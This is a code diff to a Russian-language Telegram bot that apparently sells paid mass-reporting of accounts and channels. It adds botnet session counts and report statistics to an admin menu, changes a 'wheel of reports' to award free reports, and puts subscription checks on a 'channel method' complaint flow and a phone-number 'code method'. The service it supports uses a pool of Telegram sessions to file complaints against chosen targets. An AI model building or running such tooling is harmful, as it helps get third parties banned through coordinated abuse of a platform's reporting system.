@@ -232,6 +232,9 @@ async def admin(message):
 		users_count = await db.get_users_count()
 		sessions_count = len(os.listdir(session_folder)) if os.path.exists(session_folder) else 0
 		sessions_count_prem = len(os.listdir(session_folder_prem)) if os.path.exists(session_folder_prem) else 0
+		subscribers_count = await db.get_subscribers_count()
+		mirrors_count = await db.get_mirrors_count()
+		reports_users_count = await db.get_users_with_reports_count()
 		try:
 			with open("mails.txt", "r", encoding="utf-8") as f:
 				mails_count = len([l for l in f if l.strip()])
@@ -240,6 +243,9 @@ async def admin(message):
 		text = (
 			">🤖 *Админ меню:*\n\n📊 *Статистика:*\n"
 			f"*├─👥 Всего пользователей:* `{users_count}`\n"
+			f"*├─💳 С подпиской:* `{subscribers_count}`\n"
+			f"*├─🎯 С репортами:* `{reports_users_count}`\n"
+			f"*├─🪞 Зеркал:* `{mirrors_count}`\n"
 			f"*├─🕒 Сессий в ботнете:* `{sessions_count}`\n"
 			f"*├─👑 Сессий в премиум ботнете:* `{sessions_count_prem}`\n"
 			f"*├─🌐 Web\-Reports:* `{report_count333}`\n"
@@ -886,15 +892,14 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				await bot_instance.edit_message_caption(
 					call.message.chat.id, call.message.message_id,
 					caption=(
-						f"🎡 *Колесо удачи*\n\n"
+						f"🎡 *Колесо репортов*\n\n"
 						f"⏳ *Следующий спин через: {h}ч {m}м*\n\n"
 						f"🎰 *Призы:*\n"
-						f"▪️ 55% — Ничего\n"
-						f"▪️ 20% — 1 бесплатный репорт\n"
-						f"▪️ 10% — Подписка на 1 день\n"
-						f"▪️ 9% — 3 бесплатных репорта\n"
-						f"▪️ 5% — Премиум\n"
-						f"▪️ 1% — Подписка навсегда 🍀"
+						f"▪️ 60% — Ничего\n"
+						f"▪️ 19% — 1 репорт\n"
+						f"▪️ 10% — 2 репорта\n"
+						f"▪️ 5% — 3 репорта\n"
+						f"▪️ 1% — 5 репортов 🍀"
 					),
 					parse_mode="Markdown", reply_markup=keyboards.wheel_markup
 				)
@@ -902,14 +907,13 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				await bot_instance.edit_message_caption(
 					call.message.chat.id, call.message.message_id,
 					caption=(
-						f"🎡 *Колесо удачи*\n\n"
+						f"🎡 *Колесо репортов*\n\n"
 						f"🎰 *Призы:*\n"
-						f"▪️ 55% — Ничего\n"
-						f"▪️ 20% — 1 бесплатный репорт\n"
-						f"▪️ 10% — Подписка на 1 день\n"
-						f"▪️ 9% — 3 бесплатных репорта\n"
-						f"▪️ 5% — Премиум\n"
-						f"▪️ 1% — Подписка навсегда 🍀\n\n"
+						f"▪️ 60% — Ничего\n"
+						f"▪️ 19% — 1 репорт\n"
+						f"▪️ 10% — 2 репорта\n"
+						f"▪️ 5% — 3 репорта\n"
+						f"▪️ 1% — 5 репортов 🍀\n\n"
 						f"✅ *Крутить можно!*"
 					),
 					parse_mode="Markdown", reply_markup=keyboards.wheel_markup
@@ -944,7 +948,13 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 
 			import random as _random
 			roll = _random.random() * 100
-			if roll < 20:
+			if roll < 1:
+				prize = "reports_5"
+			elif roll < 6:
+				prize = "reports_3"
+			elif roll < 16:
+				prize = "reports_2"
+			elif roll < 35:
 				prize = "reports_1"
 			else:
 				prize = "nothing"
@@ -952,38 +962,29 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await db.set_wheel_prize(uid, prize)
 
 			prize_texts = {
-				"forever": ("🍀 *Невероятно! Подписка навсегда!*", "🍀 Подписка навсегда"),
-				"premium": ("⭐️ *Вам выдан Премиум!*", "⭐️ Премиум"),
-				"sub_1d": ("🎉 *Подписка на 1 день!*", "🎉 Подписка 1 день"),
-				"reports_3": ("🎯 *3 бесплатных репорта!*", "🎯 3 репорта"),
-				"reports_1": ("🎯 *1 бесплатный репорт!*", "🎯 1 репорт"),
-				"nothing": ("😔 *Ничего... Повезёт в следующий раз!*", "😔 Ничего"),
+				"reports_5": ("🍀 *Невероятно! +5 репортов!*", "🍀 5 репортов"),
+				"reports_3": ("🎯 *+3 репорта!*", "🎯 3 репорта"),
+				"reports_2": ("🎯 *+2 репорта!*", "🎯 2 репорта"),
+				"reports_1": ("🎯 *+1 репорт!*", "🎯 1 репорт"),
+				"nothing":   ("😔 *Ничего... Повезёт в следующий раз!*", "😔 Ничего"),
 			}
 			text, log_text = prize_texts[prize]
 
-			if prize == "forever":
-				await db.set_subscribe(uid, "2099-12-31 23:59:59", force=True)
-			elif prize == "premium":
-				await db.set_premium(uid, 1)
-			elif prize == "sub_1d":
-				new_date = (now + timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")
-				await db.set_subscribe(uid, new_date)
+			if prize == "reports_5":
+				await db.add_free_reports(uid, 5)
 			elif prize == "reports_3":
 				await db.add_free_reports(uid, 3)
+			elif prize == "reports_2":
+				await db.add_free_reports(uid, 2)
 			elif prize == "reports_1":
 				await db.add_free_reports(uid, 1)
-
-			if prize in ("forever", "premium", "sub_1d"):
-				next_spin_note = "🔒 *Следующий спин доступен после истечения выигранной подписки*"
-			else:
-				next_spin_note = "⏳ *Следующий спин через 6 часов*"
 
 			await bot_instance.edit_message_caption(
 				call.message.chat.id, call.message.message_id,
 				caption=(
-					f"🎡 *Колесо удачи*\n\n"
+					f"🎡 *Колесо репортов*\n\n"
 					f"🎰 Результат:\n{text}\n\n"
-					f"{next_spin_note}"
+					f"⏳ *Следующий спин через 6 часов*"
 				),
 				parse_mode="Markdown", reply_markup=back_markup
 			)
@@ -1053,8 +1054,9 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 		elif d == "channel_method":
 			if bot_off():
 				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Бот выключен\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
-			if sub_expired():
-				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *оплати\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			free_reports_ch = await db.get_free_reports(uid)
+			if sub_expired() and free_reports_ch == 0:
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *оплати или получи бесплатный репорт\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
 			await bot_instance.edit_message_caption(
 				call.message.chat.id, call.message.message_id,
 				caption="📢 *Канал-метод*\n\n*└─ Выберите причину жалобы:*",
@@ -1103,6 +1105,8 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 		elif d == "code_method":
 			if bot_off():
 				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Бот выключен\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			if sub_expired():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Нужна подписка\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
 			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitPhoneFSM.phone.state)
 			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token)
 			await bot_instance.edit_message_caption(
